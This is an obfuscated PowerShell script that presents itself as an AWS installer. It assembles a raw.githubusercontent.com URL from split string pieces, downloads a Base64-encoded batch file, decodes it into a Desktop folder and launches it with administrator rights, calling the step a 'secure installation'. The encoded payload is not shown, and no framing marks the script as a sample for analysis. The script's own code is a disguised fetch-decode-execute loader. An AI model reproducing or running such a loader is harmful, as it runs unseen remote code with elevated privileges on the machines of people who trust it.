$RePoBaSe = ("ht" + "tp" + "s:/" + "/raw.github" + "usercontent.com/sahmsec/Cyberfox/main")
$BaTurl = $RePoBaSe + "/" + "aws-" + "install.bat"

$DeSkToP = [Environment]::GetFolderPath("Desktop")
$AWsFolDer = Join-Path $DeSkToP -ChildPath ('AWS')

if (!(Test-Path $AWsFolDer)) { ni $AWsFolDer -Type Directory | Out-Null }

$BatFiLe = Join-Path $AWsFolDer ("aws-install-" + (Get-Date -Format 'yyyyMMddHHmmss') + ".bat")

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $OldPP = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'

    Write "Downloading Base64-encoded batch file to $AWsFolDer ..." -ForegroundColor Cyan

    $Content = Invoke-WebRequest -Uri $BaTurl -UseBasicParsing -ErrorAction Stop | Select -ExpandProperty Content

    $ProgressPreference = $OldPP

    Write "Decoding and saving batch file..." -ForegroundColor Cyan

    $Bytes = [Convert]::FromBase64String($Content)

    [IO.File]::WriteAllBytes($BatFiLe, $Bytes)

    Write "`nSaved decoded batch file to: $BatFiLe" -ForegroundColor Cyan

    Write "Starting secure installation..." -ForegroundColor Green

    Start-Process -FilePath $BatFiLe -Verb RunAs
    exit

} catch {
    Write "`n[ERROR] Installation failed: $_" -ForegroundColor Red
    exit 1
}
